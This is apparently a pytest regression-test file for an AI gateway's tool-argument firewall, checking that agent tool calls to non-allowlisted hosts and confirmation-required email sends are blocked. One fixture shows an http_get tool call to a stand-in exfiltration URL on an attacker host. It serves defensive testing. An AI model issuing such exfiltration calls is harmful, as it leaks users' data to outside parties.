"""Regression tests for HTTP gateway tool-argument firewall enforcement."""

from __future__ import annotations

import pytest

try:
    from memgar.gateway.app import Gateway
    from memgar.gateway.policy import GatewayPolicy, InputPolicy, PolicyDecision

    _GATEWAY_AVAILABLE = True
except ImportError:
    _GATEWAY_AVAILABLE = False

skip_no_gw = pytest.mark.skipif(
    not _GATEWAY_AVAILABLE, reason="gateway extras (fastapi/httpx) not installed"
)


@skip_no_gw
class TestGatewayToolFirewall:
    def test_blocks_disallowed_tool_egress_host(self):
        policy = GatewayPolicy(
            upstream_base_url="https://api.openai.com",
            input=InputPolicy(enforce_tool_argument_firewall=True, scan_tool_arguments=True),
            tool_allowlist_hosts=["api.openai.com"],
        )
        gw = Gateway(policy=policy)

        verdict = gw.scan_request(
            {
                "model": "gpt-4o-mini",
                "messages": [
                    {
                        "role": "assistant",
                        "tool_calls": [
                            {
                                "id": "call_1",
                                "type": "function",
                                "function": {
                                    "name": "http_get",
                                    "arguments": '{"url":"https://evil.attacker.com/exfil"}',
                                },
                            }
                        ],
                    }
                ],
            }
        )

        assert verdict["decision"] == PolicyDecision.BLOCK
        assert verdict["risk"] >= 35
        assert "disallowed_host" in verdict["reason"]

    def test_allows_allowlisted_tool_egress_host(self):
        policy = GatewayPolicy(
            upstream_base_url="https://api.openai.com",
            input=InputPolicy(enforce_tool_argument_firewall=True, scan_tool_arguments=True),
            tool_allowlist_hosts=["api.openai.com"],
        )
        gw = Gateway(policy=policy)

        verdict = gw.scan_request(
            {
                "model": "gpt-4o-mini",
                "messages": [
                    {
                        "role": "assistant",
                        "tool_calls": [
                            {
                                "id": "call_1",
                                "type": "function",
                                "function": {
                                    "name": "http_get",
                                    "arguments": '{"url":"https://api.openai.com/v1/models"}',
                                },
                            }
                        ],
                    }
                ],
            }
        )

        assert verdict["decision"] in (PolicyDecision.ALLOW, PolicyDecision.SANITIZE)

    def test_blocks_confirmation_required_tools_in_strict_gateway_mode(self):
        policy = GatewayPolicy(
            upstream_base_url="https://api.openai.com",
            input=InputPolicy(enforce_tool_argument_firewall=True, scan_tool_arguments=True),
            tool_allowlist_hosts=["api.openai.com"],
        )
        gw = Gateway(policy=policy)

        verdict = gw.scan_request(
            {
                "model": "gpt-4o-mini",
                "tool_calls": [
                    {
                        "id": "call_2",
                        "type": "function",
                        "function": {
                            "name": "send_email",
                            "arguments": {
                                "to": "security@example.com",
                                "subject": "status",
                                "body": "all green",
                            },
                        },
                    }
                ],
            }
        )

        assert verdict["decision"] == PolicyDecision.BLOCK
        assert verdict["risk"] >= 70
        assert "path=" in verdict["reason"]
